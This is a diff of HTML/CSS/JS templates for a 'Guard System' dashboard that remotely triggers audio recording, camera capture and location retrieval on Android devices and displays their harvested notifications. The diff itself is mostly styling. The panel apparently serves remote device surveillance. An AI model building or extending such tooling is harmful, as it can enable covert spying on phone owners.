+            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
             color: white;
         }
         
         .btn-back {
-            background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
-            color: white;
-        }
-        
-        .btn-recorder {
-            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
+            background: linear-gradient(135deg, var(--gray) 0%, #4b5563 100%);
             color: white;
         }
         
         .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.4);
         }
         
         /* Control Sections */
         .control-section {
-            background: rgba(25, 25, 25, 0.95);
+            background: rgba(31, 41, 55, 0.8);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
             padding: 30px;
             margin-bottom: 25px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
         }
         
         .section-title {
-            color: #00b7ff;
+            color: var(--light);
             font-size: 1.5rem;
             font-weight: 700;
             margin-bottom: 25px;
             display: flex;
             align-items: center;
             gap: 12px;
-            border-bottom: 2px solid rgba(0, 183, 255, 0.3);
+            border-bottom: 2px solid rgba(99, 102, 241, 0.3);
             padding-bottom: 12px;
         }
         
@@ -1240,7 +1732,7 @@ DEVICE_DASHBOARD_HTML = """
         
         .control-group label {
             display: block;
-            color: #00b7ff;
+            color: var(--primary);
             margin-bottom: 8px;
             font-weight: 600;
             font-size: 0.9rem;
@@ -1251,8 +1743,8 @@ DEVICE_DASHBOARD_HTML = """
         .control-group input {
             background: rgba(255, 255, 255, 0.05);
             border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            color: #fff;
+            border-radius: 10px;
+            color: var(--light);
             padding: 12px 15px;
             font-size: 1rem;
             width: 120px;
@@ -1261,8 +1753,9 @@ DEVICE_DASHBOARD_HTML = """
         
         .control-group input:focus {
             outline: none;
-            border-color: #00b7ff;
-            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(99, 102, 241, 0.3);
+            background: rgba(255, 255, 255, 0.1);
         }
         
         /* Control Buttons */
@@ -1284,37 +1777,37 @@ DEVICE_DASHBOARD_HTML = """
             display: inline-flex;
             align-items: center;
             gap: 8px;
+            color: white;
         }
         
         .btn-start {
-            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
-            color: white;
+            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
         }
         
         .btn-stop {
-            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
-            color: white;
+            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
         }
         
         .btn-camera-front {
-            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
-            color: white;
+            background: linear-gradient(135deg, var(--info) 0%, #2563eb 100%);
         }
         
         .btn-camera-back {
-            background: linear-gradient(135deg, #6f42c1 0%, #5a2d91 100%);
-            color: white;
+            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
         }
         
         .btn-location {
-            background: linear-gradient(135deg, #ff6b35 0%, #e55627 100%);
-            color: white;
+            background: linear-gradient(135deg, var(--warning) 0%, #d97706 100%);
+        }
+        
+        .btn-notification {
+            background: linear-gradient(135deg, #ec4899 0%, #db2777 100%);
         }
         
         /* Status Indicators */
         .signal-status {
             padding: 10px 15px;
-            border-radius: 8px;
+            border-radius: 10px;
             font-weight: 600;
             font-size: 0.9rem;
             text-transform: uppercase;
@@ -1325,15 +1818,15 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .status-active {
-            background: rgba(40, 167, 69, 0.2);
-            color: #28a745;
-            border: 1px solid rgba(40, 167, 69, 0.5);
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            border: 1px solid rgba(16, 185, 129, 0.5);
         }
         
         .status-inactive {
-            background: rgba(108, 117, 125, 0.2);
-            color: #6c757d;
-            border: 1px solid rgba(108, 117, 125, 0.5);
+            background: rgba(107, 114, 128, 0.2);
+            color: var(--gray);
+            border: 1px solid rgba(107, 114, 128, 0.5);
         }
         
         /* File Lists */
@@ -1345,7 +1838,7 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .file-card {
-            background: rgba(40, 40, 40, 0.8);
+            background: rgba(55, 65, 81, 0.6);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             padding: 20px;
@@ -1354,21 +1847,22 @@ DEVICE_DASHBOARD_HTML = """
         
         .file-card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
-            border-color: #00b7ff;
+            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
+            border-color: var(--primary);
         }
         
         .file-name {
-            color: #00b7ff;
+            color: var(--primary);
             font-weight: 600;
             margin-bottom: 8px;
             word-break: break-all;
+            font-size: 0.9rem;
         }
         
         .file-info {
             display: flex;
             justify-content: space-between;
-            color: #888;
+            color: var(--gray);
             font-size: 0.85rem;
             margin-bottom: 12px;
         }
@@ -1382,7 +1876,7 @@ DEVICE_DASHBOARD_HTML = """
             flex: 1;
             padding: 8px 12px;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 0.8rem;
             font-weight: 600;
             cursor: pointer;
@@ -1393,11 +1887,11 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .btn-download {
-            background: linear-gradient(135deg, #28a745 0%, #1e7e34 100%);
+            background: linear-gradient(135deg, var(--success) 0%, #059669 100%);
         }
         
         .btn-delete {
-            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
+            background: linear-gradient(135deg, var(--danger) 0%, #dc2626 100%);
         }
         
         /* Photos Grid */
@@ -1409,7 +1903,7 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .photo-card {
-            background: rgba(40, 40, 40, 0.8);
+            background: rgba(55, 65, 81, 0.6);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 12px;
             overflow: hidden;
@@ -1418,15 +1912,15 @@ DEVICE_DASHBOARD_HTML = """
         
         .photo-card:hover {
             transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.3);
-            border-color: #00b7ff;
+            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.3);
+            border-color: var(--primary);
         }
         
         .photo-img {
             width: 100%;
             height: 150px;
             object-fit: cover;
-            background: #1a1a1a;
+            background: var(--dark);
         }
         
         .photo-info {
@@ -1434,7 +1928,7 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .photo-name {
-            color: #00b7ff;
+            color: var(--primary);
             font-size: 0.85rem;
             font-weight: 600;
             margin-bottom: 5px;
@@ -1442,24 +1936,125 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         .photo-size {
-            color: #888;
+            color: var(--gray);
             font-size: 0.75rem;
+        }
+        
+        /* Notifications List */
+        .notifications-list {
+            margin-top: 20px;
+        }
+        
+        .notification-item {
+            background: rgba(55, 65, 81, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            transition: all 0.3s ease;
+        }
+        
+        .notification-item:hover {
+            border-color: var(--primary);
+            transform: translateX(5px);
+        }
+        
+        .notification-item.unread {
+            border-left: 4px solid var(--primary);
+            background: rgba(99, 102, 241, 0.1);
+        }
+        
+        .notification-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 8px;
+        }
+        
+        .notification-title {
+            color: var(--light);
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+        
+        .notification-time {
+            color: var(--gray);
+            font-size: 0.8rem;
+        }
+        
+        .notification-text {
+            color: var(--gray);
+            font-size: 0.85rem;
+            margin-bottom: 8px;
+        }
+        
+        .notification-package {
+            color: var(--primary);
+            font-size: 0.75rem;
+            font-weight: 500;
         }
         
         .empty-state {
             text-align: center;
             padding: 40px 20px;
-            color: #666;
+            color: var(--gray);
         }
         
         .empty-state h4 {
             font-size: 1.2rem;
             margin-bottom: 10px;
-            color: #888;
+            color: var(--light);
+        }
+        
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 10px;
+        }
+        
+        .tab {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--gray);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+        
+        .tab.active {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
         }
         
         /* Responsive */
         @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .device-info {
+                justify-content: center;
+            }
+            
             .controls {
                 flex-direction: column;
                 align-items: stretch;
@@ -1472,6 +2067,10 @@ DEVICE_DASHBOARD_HTML = """
             .files-grid {
                 grid-template-columns: 1fr;
             }
+            
+            .photos-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
         }
     </style>
 </head>
@@ -1483,151 +2082,238 @@ DEVICE_DASHBOARD_HTML = """
                 <h1>🎮 {{ device.name }}</h1>
                 <p>Device Control Panel</p>
                 <div class="device-info">
-                    Model: {{ device.model }} | ID: {{ device_id }}
+                    <div class="device-info-item">
+                        <span>📱 Model:</span>
+                        <span>{{ device.model }}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>🆔 ID:</span>
+                        <span>{{ device_id }}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>🌐 IP:</span>
+                        <span>{{ device.ip_address }}</span>
+                    </div>
+                    <div class="device-info-item">
+                        <span>🤖 Android:</span>
+                        <span>{{ device.android_version }}</span>
+                    </div>
                 </div>
             </div>
             <div class="header-right">
-                <a href="/" class="btn btn-back">⬅️ Back to Devices</a>
+                <a href="/" class="btn btn-back">⬅️ All Devices</a>
                 <a href="/logout" class="btn btn-logout">🚪 Logout</a>
             </div>
         </header>
 
-        <!-- Recording Controls -->
-        <div class="control-section">
-            <div class="section-title">🎤 Audio Recording Controls</div>
-            
-            <div class="control-group">
-                <label for="recordTime">Recording Duration (seconds):</label>
-                <input type="number" id="recordTime" value="15" min="5" max="300">
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('controls')">🎮 Controls</button>
+            <button class="tab" onclick="switchTab('files')">📁 Files</button>
+            <button class="tab" onclick="switchTab('notifications')">🔔 Notifications</button>
+        </div>
+
+        <!-- Controls Tab -->
+        <div id="controls" class="tab-content active">
+            <!-- Recording Controls -->
+            <div class="control-section">
+                <div class="section-title">🎤 Audio Recording Controls</div>
+                
+                <div class="control-group">
+                    <label for="recordTime">Recording Duration (seconds):</label>
+                    <input type="number" id="recordTime" value="15" min="5" max="300">
+                </div>
+                
+                <div class="controls">
+                    <button class="btn-control btn-start" onclick="startRecording()">
+                        🎤 Start Recording
+                    </button>
+                    <button class="btn-control btn-stop" onclick="stopRecording()">
+                        ⏹️ Stop Recording
+                    </button>
+                    <div class="signal-status status-inactive" id="recordingStatus">
+                        🔴 Recording: Inactive
+                    </div>
+                </div>
             </div>
-            
-            <div class="controls">
-                <button class="btn-control btn-start" onclick="startRecording()">
-                    🎤 Start Recording
-                </button>
-                <button class="btn-control btn-stop" onclick="stopRecording()">
-                    ⏹️ Stop Recording
-                </button>
-                <div class="signal-status status-inactive" id="recordingStatus">
-                    🔴 Recording: Inactive
+
+            <!-- Camera Controls -->
+            <div class="control-section">
+                <div class="section-title">📸 Camera Controls</div>
+                
+                <div class="controls">
+                    <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
+                        📱 Front Camera
+                    </button>
+                    <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
+                        📷 Back Camera
+                    </button>
+                    <div class="signal-status status-inactive" id="cameraStatus">
+                        🔴 Camera: Inactive
+                    </div>
+                </div>
+            </div>
+
+            <!-- Location Controls -->
+            <div class="control-section">
+                <div class="section-title">📍 Location Controls</div>
+                
+                <div class="controls">
+                    <button class="btn-control btn-location" onclick="getLocation()">
+                        📍 Get Location
+                    </button>
+                    <div class="signal-status status-inactive" id="locationStatus">
+                        🔴 Location: Inactive
+                    </div>
+                </div>
+            </div>
+
+            <!-- Notification Controls -->
+            <div class="control-section">
+                <div class="section-title">🔔 Notification Controls</div>
+                
+                <div class="controls">
+                    <button class="btn-control btn-notification" onclick="testNotification()">
+                        🔔 Send Test Notification
+                    </button>
+                    <button class="btn-control btn-stop" onclick="clearNotifications()">
+                        🗑️ Clear All Notifications
+                    </button>
                 </div>
             </div>
         </div>
 
-        <!-- Camera Controls -->
-        <div class="control-section">
-            <div class="section-title">📸 Camera Controls</div>
-            
-            <div class="controls">
-                <button class="btn-control btn-camera-front" onclick="captureCamera('front')">
-                    📱 Front Camera
-                </button>
-                <button class="btn-control btn-camera-back" onclick="captureCamera('back')">
-                    📷 Back Camera
-                </button>
-                <div class="signal-status status-inactive" id="cameraStatus">
-                    🔴 Camera: Inactive
+        <!-- Files Tab -->
+        <div id="files" class="tab-content">
+            <!-- Recordings List -->
+            <div class="control-section">
+                <div class="section-title">🎵 Recent Recordings</div>
+                
+                {% if files %}
+                <div class="files-grid">
+                    {% for file in files %}
+                    <div class="file-card">
+                        <div class="file-name">{{ file.name }}</div>
+                        <div class="file-info">
+                            <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
+                            <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
+                        </div>
+                        <div class="file-actions">
+                            <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
+                            <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
+                        </div>
+                    </div>
+                    {% endfor %}
                 </div>
+                {% else %}
+                <div class="empty-state">
+                    <h4>📭 No Recordings Found</h4>
+                    <p>Start recording to see files here</p>
+                </div>
+                {% endif %}
+            </div>
+
+            <!-- Photos List -->
+            <div class="control-section">
+                <div class="section-title">🖼️ Recent Photos</div>
+                
+                {% if photos %}
+                <div class="photos-grid">
+                    {% for photo in photos %}
+                    <div class="photo-card">
+                        <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" 
+                             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
+                        <div class="photo-info">
+                            <div class="photo-name">{{ photo.name }}</div>
+                            <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div class="empty-state">
+                    <h4>📷 No Photos Found</h4>
+                    <p>Capture photos using camera controls</p>
+                </div>
+                {% endif %}
+            </div>
+
+            <!-- Location Files -->
+            <div class="control-section">
+                <div class="section-title">🗺️ Location History</div>
+                
+                {% if location_files %}
+                <div class="files-grid">
+                    {% for location in location_files %}
+                    <div class="file-card">
+                        <div class="file-name">{{ location.name }}</div>
+                        <div class="file-info">
+                            <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
+                            <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
+                        </div>
+                        <div class="file-actions">
+                            <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
+                            <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
+                        </div>
+                    </div>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <div class="empty-state">
+                    <h4>🗺️ No Location Data</h4>
+                    <p>Get location data using location controls</p>
+                </div>
+                {% endif %}
             </div>
         </div>
 
-        <!-- Location Controls -->
-        <div class="control-section">
-            <div class="section-title">📍 Location Controls</div>
-            
-            <div class="controls">
-                <button class="btn-control btn-location" onclick="getLocation()">
-                    📍 Get Location
-                </button>
-                <div class="signal-status status-inactive" id="locationStatus">
-                    🔴 Location: Inactive
+        <!-- Notifications Tab -->
+        <div id="notifications" class="tab-content">
+            <div class="control-section">
+                <div class="section-title">🔔 Device Notifications</div>
+                
+                {% if notifications %}
+                <div class="notifications-list">
+                    {% for notification in notifications %}
+                    <div class="notification-item {{ 'unread' if not notification.read }}">
+                        <div class="notification-header">
+                            <div class="notification-title">{{ notification.title }}</div>
+                            <div class="notification-time">{{ notification.timestamp|int|string|truncate(10, True, '') }}</div>
+                        </div>
+                        <div class="notification-text">{{ notification.text }}</div>
+                        <div class="notification-package">{{ notification.package }}</div>
+                    </div>
+                    {% endfor %}
                 </div>
-            </div>
-        </div>
-
-        <!-- Recordings List -->
-        <div class="control-section">
-            <div class="section-title">🎵 Recent Recordings</div>
-            
-            {% if files %}
-            <div class="files-grid">
-                {% for file in files %}
-                <div class="file-card">
-                    <div class="file-name">{{ file.name }}</div>
-                    <div class="file-info">
-                        <span>Size: {{ (file.size / 1024 / 1024)|round(2) }} MB</span>
-                        <span>{{ file.modified|int|string|truncate(10, True, '') }}</span>
-                    </div>
-                    <div class="file-actions">
-                        <a href="/files/{{ file.name }}" class="btn-file btn-download" download>📥 Download</a>
-                        <button class="btn-file btn-delete" onclick="deleteFile('{{ file.name }}')">🗑️ Delete</button>
-                    </div>
+                {% else %}
+                <div class="empty-state">
+                    <h4>🔔 No Notifications</h4>
+                    <p>Device notifications will appear here</p>
                 </div>
-                {% endfor %}
+                {% endif %}
             </div>
-            {% else %}
-            <div class="empty-state">
-                <h4>📭 No Recordings Found</h4>
-                <p>Start recording to see files here</p>
-            </div>
-            {% endif %}
-        </div>
-
-        <!-- Photos List -->
-        <div class="control-section">
-            <div class="section-title">🖼️ Recent Photos</div>
-            
-            {% if photos %}
-            <div class="photos-grid">
-                {% for photo in photos %}
-                <div class="photo-card">
-                    <img src="/files/{{ photo.name }}" alt="{{ photo.name }}" class="photo-img" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjE1MCIgdmlld0JveD0iMCAwIDIwMCAxNTAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMTUwIiBmaWxsPSIjMUExQTFBIi8+CjxwYXRoIGQ9Ik03NSA1MEgxMjVNMTI1IDUwSDEyNS41TTEyNSA1MEwxMjUgNTAuNVpNNzUgNzVIMTI1TTc1IDEwMEgxMjUiIHN0cm9rZT0iIzMzMyIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxjaXJjbGUgY3g9Ijc1IiBjeT0iMTAwIiByPSIxNSIgZmlsbD0iIzMzMyIvPgo8L3N2Zz4K'">
-                    <div class="photo-info">
-                        <div class="photo-name">{{ photo.name }}</div>
-                        <div class="photo-size">{{ (photo.size / 1024)|round(2) }} KB</div>
-                    </div>
-                </div>
-                {% endfor %}
-            </div>
-            {% else %}
-            <div class="empty-state">
-                <h4>📷 No Photos Found</h4>
-                <p>Capture photos using camera controls</p>
-            </div>
-            {% endif %}
-        </div>
-
-        <!-- Location Files -->
-        <div class="control-section">
-            <div class="section-title">🗺️ Location History</div>
-            
-            {% if location_files %}
-            <div class="files-grid">
-                {% for location in location_files %}
-                <div class="file-card">
-                    <div class="file-name">{{ location.name }}</div>
-                    <div class="file-info">
-                        <span>Size: {{ (location.size / 1024)|round(2) }} KB</span>
-                        <span>{{ location.modified|int|string|truncate(10, True, '') }}</span>
-                    </div>
-                    <div class="file-actions">
-                        <a href="/files/{{ location.name }}" class="btn-file btn-download" download>📥 Download</a>
-                        <button class="btn-file btn-delete" onclick="deleteFile('{{ location.name }}')">🗑️ Delete</button>
-                    </div>
-                </div>
-                {% endfor %}
-            </div>
-            {% else %}
-            <div class="empty-state">
-                <h4>🗺️ No Location Data</h4>
-                <p>Get location data using location controls</p>
-            </div>
-            {% endif %}
         </div>
     </div>
 
     <script>
         const deviceId = "{{ device_id }}";
+        
+        // Tab switching
+        function switchTab(tabName) {
+            // Hide all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+            
+            // Update tab buttons
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            event.target.classList.add('active');
+        }
         
         // Recording functions
         async function startRecording() {
@@ -1657,7 +2343,6 @@ DEVICE_DASHBOARD_HTML = """
         }
         
         function stopRecording() {
-            // For now, stopping is handled automatically after the recording duration
             updateStatus('recordingStatus', '🔴 Recording: Inactive', 'status-inactive');
             showNotification('Recording will stop automatically after duration', 'info');
         }
@@ -1721,6 +2406,36 @@ DEVICE_DASHBOARD_HTML = """
             }
         }
         
+        // Notification functions
+        async function testNotification() {
+            try {
+                showNotification('Test notification feature coming soon!', 'info');
+            } catch (error) {
+                console.error('Error:', error);
+                showNotification('Notification test failed', 'error');
+            }
+        }
+        
+        async function clearNotifications() {
+            if (confirm('Are you sure you want to clear all notifications?')) {
+                try {
+                    const response = await fetch(`/device/${deviceId}/clear-notifications`, {
+                        method: 'POST'
+                    });
+                    
+                    if (response.ok) {
+                        showNotification('All notifications cleared', 'success');
+                        setTimeout(() => location.reload(), 1000);
+                    } else {
+                        showNotification('Failed to clear notifications', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    showNotification('Failed to clear notifications', 'error');
+                }
+            }
+        }
+        
         // Utility functions
         function updateStatus(elementId, text, className) {
             const element = document.getElementById(elementId);
@@ -1753,154 +2468,11 @@ DEVICE_DASHBOARD_HTML = """
             }
         }
         
-        // Auto-refresh photos and location data every 10 seconds
+        // Auto-refresh data every 10 seconds
         setInterval(() => {
             // You can implement auto-refresh for specific sections here
         }, 10000);
     </script>
-</body>
-</html>
-"""
-
-# LOGIN_HTML template (keep your existing login template)
-LOGIN_HTML = """
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🚀 Guard System - Login</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 50%, #2d2d2d 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-        
-        .login-container {
-            background: rgba(25, 25, 25, 0.95);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
-        }
-        
-        .login-header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .login-header h1 {
-            color: #00b7ff;
-            font-size: 2.5rem;
-            font-weight: 700;
-            text-shadow: 0 0 20px rgba(0, 183, 255, 0.5);
-            margin-bottom: 10px;
-        }
-        
-        .login-header p {
-            color: #888;
-            font-size: 1rem;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            color: #00b7ff;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 0.9rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .form-group input {
-            width: 100%;
-            background: rgba(255, 255, 255, 0.05);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            color: #fff;
-            padding: 15px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
-        }
-        
-        .form-group input:focus {
-            outline: none;
-            border-color: #00b7ff;
-            box-shadow: 0 0 20px rgba(0, 183, 255, 0.3);
-        }
-        
-        .login-btn {
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 10px;
-            background: linear-gradient(135deg, #00b7ff 0%, #0099cc 100%);
-            color: white;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .login-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(0, 183, 255, 0.4);
-        }
-        
-        .error-message {
-            color: #ff4444;
-            text-align: center;
-            margin-top: 15px;
-            font-size: 0.9rem;
-        }
-    </style>
-</head>
-<body>
-    <div class="login-container">
-        <div class="login-header">
-            <h1>🚀 GUARD SYSTEM</h1>
-            <p>Secure Access Portal</p>
-        </div>
-        
-        <form method="POST">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
-            </div>
-            
-            <button type="submit" class="login-btn">🔐 Login</button>
-            
-            {% if error %}
-            <div class="error-message">{{ error }}</div>
-            {% endif %}
-        </form>
-    </div>
 </body>
 </html>
 """
